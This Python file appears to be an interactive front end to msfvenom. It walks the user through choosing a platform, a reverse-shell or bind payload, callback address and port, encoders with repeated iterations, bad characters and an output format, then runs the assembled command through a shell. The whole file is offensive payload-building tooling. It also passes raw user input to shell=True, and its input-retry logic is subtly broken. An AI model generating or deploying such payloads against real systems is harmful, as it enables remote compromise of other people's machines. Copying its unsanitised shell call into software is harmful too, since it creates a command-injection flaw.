#!/usr/bin/python3

from venominator import attributes
from subprocess import call


class Venom(object):
    def __init__(self):
        self.d = {}

    def build_cmd(self) -> None:
        options = []
        for v in self.d.values():
            options.append(v)
        self.cmd = f"msfvenom {' '.join(options)}"

    def set_arch(self) -> None:
        source = attributes.Architectures
        for k, v in source.items():
            print(k, v)
        i = input("Enter architecture: ")
        try:
            i = int(i)
        except ValueError:
            self.set_arch()
        if i in source.keys():
            self.d.update({"architecture": f"-a {source[i]}"})
        else:
            self.set_arch()

    def set_platform(self) -> None:
        source = attributes.Platforms
        for k, v in source.items():
            print(k, v)
        i = input("Enter platform: ")
        try:
            i = int(i)
        except ValueError:
            self.set_platform()
        if i in source.keys():
            self.d.update({"platform": f"--platform {source[i]}"})
        else:
            self.set_platform()

    def set_payload(self) -> None:
        if "x86" in self.d["architecture"] and "Windows" in self.d["platform"]:
            source = attributes.Payloads_Win_x86
        elif "x64" in self.d["architecture"] and "Windows" in self.d["platform"]:
            source = attributes.Payloads_Win_x64
        elif "x86" in self.d["architecture"] and "Linux" in self.d["platform"]:
            source = attributes.Payloads_Nix_x86
        elif "x64" in self.d["architecture"] and "Linux" in self.d["platform"]:
            source = attributes.Payloads_Nix_x64
        else:
            return
        for k, v in source.items():
            print(k, v)
        i = input("Enter payload: ")
        try:
            i = int(i)
        except ValueError:
            self.set_payload()
        if i in source.keys():
            self.d.update({"payload": f"-p {source[i]}"})
            self.set_port()
            if "reverse" in self.d["payload"]:
                self.set_address()
        else:
            self.set_payload()

    def set_port(self) -> None:
        i = input("Enter port to listen/callback on (1-65535): ")
        try:
            i = int(i)
        except ValueError:
            print(f"{i} is not an integer")
            self.set_port()
        if i > 0 and i < 65535:
            self.d.update({"port": f"LPORT={i}"})
        else:
            print(f"Port must be between 1 and 65535")
            self.set_port()
        return

    def set_address(self) -> None:
        print(f"Current command: {self.build_cmd()}")
        i = input("Enter listening host IP: ")
        self.d.update({"lhost": f"LHOST={i}"})
        return

    def set_encoder(self) -> None:
        if input("Encode payload (y/n): ").lower() == "y":
            if "x64" in self.d["architecture"]:
                source = attributes.Encoders_x64
            elif "x86" in self.d["architecture"]:
                source = attributes.Encoders_x86
            for k, v in source.items():
                print(k, v)
            i = input("Enter encoder: ")
            try:
                i = int(i)
            except ValueError:
                self.set_encoder()
            if i in source.keys():
                self.d.update({"encoder": f"-e {source[i]}"})
                self.set_iterations()
            else:
                self.set_encoder()
        else:
            pass

    def set_iterations(self) -> None:
        i = input("Enter number of encoding iterations: ")
        try:
            i = int(i)
        except ValueError:
            self.set_iterations()
        self.d.update({"iterations": f"-i {i}"})
        return

    def set_format(self) -> None:
        if "Windows" in self.d["platform"]:
            source = attributes.Formats_Win
        elif "Linux" in self.d["platform"]:
            source = attributes.Formats_Nix
        else:
            return
        for k, v in source.items():
            print(k, v)
        i = input("Enter format: ")
        try:
            i = int(i)
        except ValueError:
            self.set_format()
        if i in source.keys():
            self.d.update({"format": f"-f {source[i]}"})
        else:
            self.set_format()

    def set_bad_chars(self) -> None:
        for x in ["python", "raw", "c", "hex"]:
            if x in self.d["format"]:
                i = input("Any bad characters to avoid (y/n): ").lower()
                if i == "y":
                    sample = "\\x0a\\x20"
                    i = input(f"Enter bad characters (e.g. {sample}): ")
                    self.d.update({"badchars": f'-b "{i}"'})
                elif i == "n":
                    return
                else:
                    self.set_bad_chars()

    def set_outfile(self) -> None:
        i = input("Enter output file: ")
        self.d.update({"outfile": f"-o {i}"})

    def build_payload(self) -> None:
        self.build_cmd()
        print(self.cmd)
        i = input("Build payload? (y/n): ").lower()
        if i == "y":
            try:
                call(self.cmd, shell=True)
                filename = self.d["outfile"].split()[-1]
                with open(filename + ".log", "w") as f:
                    f.write(self.cmd)
                    f.write("\n")
            except FileNotFoundError:
                print("Looks like you don't have msfvenom installed in your PATH")

        else:
            print("Ok, here is the command to build your payload:")
            print(self.cmd)
